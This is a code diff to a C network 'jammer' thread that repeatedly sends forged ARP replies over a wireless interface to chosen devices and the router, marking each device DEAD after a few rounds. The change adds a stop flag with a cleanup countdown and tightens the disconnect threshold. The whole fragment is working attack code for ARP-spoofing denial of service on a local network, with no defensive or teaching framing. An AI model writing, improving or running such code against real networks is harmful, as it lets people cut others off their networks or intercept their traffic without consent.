@@ -1,20 +1,25 @@
+#include "./process/jammer.h"
 #include "./network.h"
 #include "./arp.h"
 
 #include <pthread.h>
 #include <unistd.h>
 #include <stdint.h>
+#include <stdbool.h>
 
 #include <arpa/inet.h>
 
 void *jam_jammed_devices(void *arg) {
-    Network *network = (Network *)arg;
+    JammerArgs *args = (JammerArgs *)arg;
+    Network *network = args->network;
+    volatile bool *stop_flag = args->stop_flag;
 
     int sockfd = arp_create_socket();
     uint8_t my_mac[6];
     get_interface_mac("wlan0", my_mac);
 
-    while (1) {
+    int cleanup = 3;
+    while (cleanup) {
         pthread_mutex_lock(&network->lock);
         Device *router = &network->devices[0];
         uint32_t router_ip = htonl(router->ip);
@@ -33,12 +38,16 @@ void *jam_jammed_devices(void *arg) {
                 arp_send_reply(sockfd, "wlan0", device->mac, &device_ip, router->mac, &router_ip);
                 arp_send_reply(sockfd, "wlan0", router->mac, &router_ip, device->mac, &device_ip);
 
-                if (device->disconnecting_counter++ > 3) {
+                if (device->disconnecting_counter++ > 2) {
                     device->status = DEAD;
+                    device->disconnecting_counter = 0;
                 }
             }
         }
         pthread_mutex_unlock(&network->lock);
+        if (*stop_flag) {
+            cleanup--;
+        }
         sleep(2);
     }
     close(sockfd);
